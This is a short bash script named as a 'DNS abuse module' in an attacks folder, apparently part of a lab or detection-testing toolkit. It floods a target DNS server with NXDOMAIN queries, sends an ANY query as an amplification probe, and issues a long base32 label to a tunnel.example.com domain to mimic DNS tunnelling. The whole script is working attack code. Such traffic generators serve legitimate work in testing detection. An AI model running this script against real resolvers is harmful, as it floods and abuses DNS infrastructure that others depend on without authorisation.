#!/usr/bin/env bash
# attacks/dns.sh — DNS abuse module
set -euo pipefail

TARGET="${DNS_TARGET:-${TARGET:-10.10.10.1}}"
COUNT="${QUERY_COUNT:-100}"

echo "[dns] Starting DNS module → $TARGET"

# 1. NXDOMAIN flood
echo "[dns] NXDOMAIN flood ($COUNT queries)..."
for i in $(seq 1 "$COUNT"); do
    dig @"$TARGET" "nonexistent${i}.invalid." A +time=1 +tries=1 >/dev/null 2>&1 || true
done

# 2. ANY query (amplification probe)
echo "[dns] ANY query amplification probe..."
dig @"$TARGET" ANY google.com +time=2 +tries=1 >/dev/null 2>&1 || true

# 3. Long label (DNS tunnelling simulation)
echo "[dns] Long label DNS tunnelling probe..."
LABEL=$(python3 -c "import base64; print(base64.b32encode(b'A'*50).decode().lower())")
dig @"$TARGET" "${LABEL}.tunnel.example.com." TXT +time=2 +tries=1 >/dev/null 2>&1 || true

echo "[dns] Module complete."
